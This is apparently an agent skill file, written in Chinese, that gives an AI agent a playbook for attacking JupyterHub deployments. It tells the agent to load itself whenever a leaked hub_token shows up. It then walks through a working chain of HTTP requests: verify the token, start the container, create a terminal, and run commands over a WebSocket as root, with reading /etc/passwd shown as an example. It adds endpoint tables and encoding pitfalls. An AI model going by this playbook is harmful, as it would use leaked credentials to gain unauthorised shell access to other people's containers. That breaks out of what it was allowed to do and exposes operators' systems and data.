---
name: jupyterhub-attack
description: "Attack JupyterHub via leaked hub_token and terminal WS."
version: 1.0.0
metadata:
  hermes:
    tags: [penetration, jupyterhub, container, websocket, token]
---

# JupyterHub 容器平台攻击链

## 触发条件

遇到以下任何一项时加载本技能：
- 单词 `hub_token` 出现在 API 响应中
- 路径包含 `/hub_api/` 或 `/hub/`
- 识别出 JupyterHub / Jupyter Notebook 部署
- AI/ML 平台（MoModel、Kubeflow 等）的容器管理

## 攻击链全景

```
hub_token 泄露（API / 页面 / 源码）
         │
         ├── ① 验证 token ──→ GET /hub_api/hub/api/user
         │                    Header: Authorization: token {hub_token}
         │
         ├── ② 启动容器 ────→ POST /hub_api/hub/api/users/{hub_name}/server
         │                    Header: Authorization: token {hub_token}
         │                    Body: (空)
         │
         ├── ③ 确认状态 ────→ GET /hub_api/hub/api/users/{hub_name}
         │                    Header: Authorization: token {hub_token}
         │                    检查: "ready": true
         │
         ├── ④ 打开终端 ────→ POST /hub_api/user/{hub_name_encoded}/api/terminals
         │                    Header: Authorization: token {hub_token}
         │                    响应: {"name": "1"}
         │
         └── ⑤ 执行命令 ────→ wss://{host}/hub_api/user/{hub_name_encoded}/terminals/websocket/1?token={hub_token}
                             发送: ["stdin","whoami\n"]
                             接收: ["stdout","root\n"]
```

## 端点速查

| 操作 | 方法 | 端点 | 认证 |
|------|------|------|------|
| 验证 token | GET | `/hub_api/hub/api/user` | `Authorization: token {t}` |
| 启动容器 | POST | `/hub_api/hub/api/users/{hub_name}/server` | 同上 + `Content-Length: 0` |
| 容器状态 | GET | `/hub_api/hub/api/users/{hub_name}` | 同上 |
| 创建终端 | POST | `/hub_api/user/{hub_name}/api/terminals` | 同上 |
| 执行命令 | WS | `/hub_api/user/{hub_name}/terminals/websocket/{n}?token={t}` | URL 参数 |

## WebSocket 协议

```
发送: ["stdin","whoami\n"]
接收: ["stdout","root\n"]
```

- 消息格式: JSON 数组 `[channel, data]`
- 命令末尾必须有 `\n`
- 可读写文件: `cat /etc/passwd` / `echo xxx > file`

## URL 编码陷阱

`hub_name` 末尾的 `=` 在不同端点上处理不同：
- `/hub_api/hub/api/...` 路径 — 不需要编码
- `/hub_api/user/...` 路径 — `=` 需编码为 `%3D`

## 平台识别线索

- 响应中出现 `hub_token` 字段 → 几乎肯定是 JupyterHub
- `container_config` 包含 `image_key: tf*` / `py*` → AI 容器

## 陷阱

- **容器可能处于停止状态** → 必须先 POST 启动，再连终端
- **`=` 编码** → `/hub_api/user/...` 需要 `%3D`，`/hub_api/hub/...` 不需要
- **终端序号** → 创建终端返回的 `name` 就是 websocket 路径序号
